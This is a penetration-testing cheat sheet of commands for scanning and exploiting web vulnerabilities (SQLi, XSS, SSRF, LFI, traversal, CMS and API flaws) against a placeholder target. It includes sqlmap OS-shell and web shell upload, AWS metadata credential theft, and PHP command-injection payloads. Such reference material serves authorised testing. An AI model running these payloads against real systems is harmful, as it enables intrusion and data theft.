# Web Vulnerability Scanning Deep Dive

## Scanning by Vulnerability Type

### SQL Injection
```bash
# Discovery: find injectable parameters
# Check URL params, POST bodies, cookies, headers
sqlmap -u "http://target/page?id=1" --batch --level 3 --risk 2

# POST injection
sqlmap -u "http://target/login" --data "user=admin&pass=test" --batch --forms

# Cookie injection
sqlmap -u "http://target/" --cookie "session=abc" --batch --level 3

# Header injection (Referer, X-Forwarded-For)
sqlmap -u "http://target/" --headers="X-Forwarded-For: 1*" --batch

# WAF bypass techniques
sqlmap -u "..." --tamper=space2comment           # SQL comment instead of spaces
sqlmap -u "..." --tamper=between                 # BETWEEN instead of > <
sqlmap -u "..." --tamper=randomcase              # rAnDoM case
sqlmap -u "..." --tamper=charunicodeencode       # Unicode encoding
sqlmap -u "..." --random-agent                   # Random user-agent

# Post-exploitation (if injectable)
sqlmap -u "..." --dbs                            # List databases
sqlmap -u "..." -D dbname --tables               # List tables
sqlmap -u "..." -D dbname -T users --dump        # Dump table
sqlmap -u "..." --os-shell                       # OS command exec
sqlmap -u "..." --file-read="/etc/passwd"        # File read
sqlmap -u "..." --file-write=shell.php --file-dest=/var/www/html/shell.php  # Upload
```

### Cross-Site Scripting (XSS)
```bash
# Nuclei XSS templates
nuclei -u http://target -tags xss -severity high,medium

# Manual verification
curl -s "http://target/search?q=<script>alert(1)</script>" | grep -c "alert(1)"

# Common XSS payloads for manual testing
# <script>alert(1)</script>
# <img src=x onerror=alert(1)>
# "><svg/onload=alert(1)>
# javascript:alert(1)
# <details/open/ontoggle=alert(1)>

# DOM XSS check
curl -s http://target/ | grep -iE "document\.(write|cookie|location)|innerHTML|eval\("
```

### Server-Side Request Forgery (SSRF)
```bash
# Nuclei SSRF templates
nuclei -u http://target -tags ssrf

# Manual: check for URL parameters
# ?url=, ?redirect=, ?next=, ?image=, ?feed=, ?to=
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/proxy?url=http://127.0.0.1:8080/"

# AWS metadata
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

### Local File Inclusion (LFI) / Remote File Inclusion (RFI)
```bash
# Nuclei LFI templates
nuclei -u http://target -tags lfi

# Manual LFI payloads
curl "http://target/page?file=../../../../etc/passwd"
curl "http://target/page?file=....//....//....//etc/passwd"  # double encoding
curl "http://target/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://target/page?file=C:\Windows\System32\drivers\etc\hosts"  # Windows

# Null byte (old PHP)
curl "http://target/page?file=../../../../etc/passwd%00"

# Wrappers
curl "http://target/page?file=php://input" -d "<?php system('id'); ?>"
curl "http://target/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
```

### Directory Traversal
```bash
# Check with dots and slashes
curl "http://target/../../../etc/passwd"
curl "http://target/..%2f..%2f..%2fetc/passwd"
curl "http://target/....//....//....//etc/passwd"

# IIS-specific traversal
curl "http://target/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
curl "http://target/..%255c..%255c..%255cwindows/win.ini"
```

### Information Disclosure
```bash
# Sensitive files
curl -s http://target/.env
curl -s http://target/.git/config
curl -s http://target/.htaccess
curl -s http://target/web.config
curl -s http://target/phpinfo.php
curl -s http://target/server-status
curl -s http://target/server-info
curl -s http://target/debug
curl -s http://target/actuator  # Spring Boot
curl -s http://target/api/swagger.json

# Backup files
curl -s http://target/backup.sql
curl -s http://target/db.sql
curl -s http://target/dump.sql
curl -s http://target/database.sql.gz

# HTML comment mining
curl -s http://target/ | grep -oP '<!--.*?-->'

# robots.txt + sitemap
curl -s http://target/robots.txt
curl -s http://target/sitemap.xml
```

## CMS-Specific Scanning

### WordPress
```bash
wpscan --url http://target --enumerate vp,vt,u,tt --no-banner
wpscan --url http://target --enumerate ap --plugins-detection aggressive
# API token for better results: --api-token <token>
```

### Joomla
```bash
nuclei -u http://target -tags joomla
curl -s http://target/administrator/
curl -s http://target/configuration.php.bak
```

### Drupal
```bash
nuclei -u http://target -tags drupal
droopescan scan drupal -u http://target
curl -s http://target/CHANGELOG.txt | head -5  # version
```

## API Scanning
```bash
# Swagger/OpenAPI discovery
curl -s http://target/swagger.json
curl -s http://target/api-docs
curl -s http://target/openapi.json
curl -s http://target/v1/api-docs

# IDOR testing (increment IDs)
curl -s http://target/api/users/1
curl -s http://target/api/users/2
# Different user's data? IDOR confirmed.

# Auth bypass
curl -s http://target/api/admin  # No auth header
curl -s http://target/api/admin -H "Authorization: Bearer invalid"
```
